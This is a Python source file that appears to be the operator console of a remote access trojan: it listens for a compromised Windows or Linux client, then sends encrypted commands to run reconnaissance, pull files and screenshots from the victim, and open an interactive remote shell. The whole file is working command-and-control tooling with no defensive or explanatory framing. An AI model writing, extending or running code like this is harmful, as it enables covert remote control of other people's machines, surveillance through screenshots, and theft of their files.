from listener.communication import Communication
from listener.cipher import Cipher
from tools.env import EnvReader
from commands.help import help
import json
from time import sleep
from commands.Windows import WindowsCommands
from commands.Linux import LinuxCommands
from datetime import datetime


def main():
    env = EnvReader()

    listener = Communication(
        port=int(env.get("SERVER_PORT"))
    )

    print("Wait connection...")

    while True:
        client_init = listener.init_listen()
        if client_init is not None:
            client_addr = client_init["addr"][0]
            data = json.loads(client_init["data"])
            if data["params"] == "Windows":
                commands_trsl = WindowsCommands()
            else:
                commands_trsl = LinuxCommands()
            break
        else:
            print(client_init)

    print("Connection received !")
    sleep(3)

    listener.connect(client_addr)

    cipher = Cipher(
        key=env.get("CRYPTO_KEY").encode('utf-8'),
        iv=env.get("CRYPTO_IV").encode('utf-8')
    )
    while True:

        command = input("> ").strip()
        if ' ' in command:
            command, params = command.split(' ', 1)
        else:
            params = ""

        if command == "help":
            help()

        elif command == "stop":
            listener.stop()
            break

        elif command == "ipconfig" or command == "find":

            match command:
                case "ipconfig":
                    command_trsl = commands_trsl.ipconfig()
                case "find":
                    command_trsl = commands_trsl.search(params)

            request = json.dumps({
                'type': 'command',
                'action': command_trsl
            }).encode('utf-8')

            response = listener.prompt(cipher.encrypt_message(request))
            decrypted = cipher.decrypt_message(response)
            result = json.loads(decrypted)

            print(result["response"])


        elif command == "download":
            request = json.dumps({
                'type': 'download',
                'action': params
            }).encode('utf-8')

            response = listener.prompt(cipher.encrypt_message(request))
            # decrypted = cipher.decrypt_message(response)
            file = open('download/' + params, 'wb')
            file.write(response)
            file.close()
            print("Download complete!")


        elif command == "screenshot":
            request = json.dumps({
                'type': 'screenshot',
                'action': params
            }).encode('utf-8')
            response = listener.prompt(cipher.encrypt_message(request))
            now = datetime.now()
            file = open("download/screenshot_xxx.png", 'wb')
            file.write(response)
            file.close()
            print("Download complete!")

        elif command == "shell":
            request = json.dumps({
                'type': 'shell',
                'action': ''
            }).encode('utf-8')

            response = listener.prompt(cipher.encrypt_message(request))
            decrypted = cipher.decrypt_message(response)
            result = json.loads(decrypted)

            if result["status"] == "OK":
                print("Shell open")
                while True:
                    action = input("Shell > ").strip()

                    request = json.dumps({
                        'type': 'shell',
                        'action': action
                    }).encode('utf-8')

                    response = listener.prompt(cipher.encrypt_message(request))
                    decrypted = cipher.decrypt_message(response)
                    result = json.loads(decrypted)

                    if result["response"] == "exit":
                        break
                    else:
                        print(result["response"])

        else:
            data = json.dumps(
                {
                    'message': command
                }
            ).encode('utf-8')

            listener.send(cipher.encrypt_message(data))


if __name__ == '__main__':
    main()
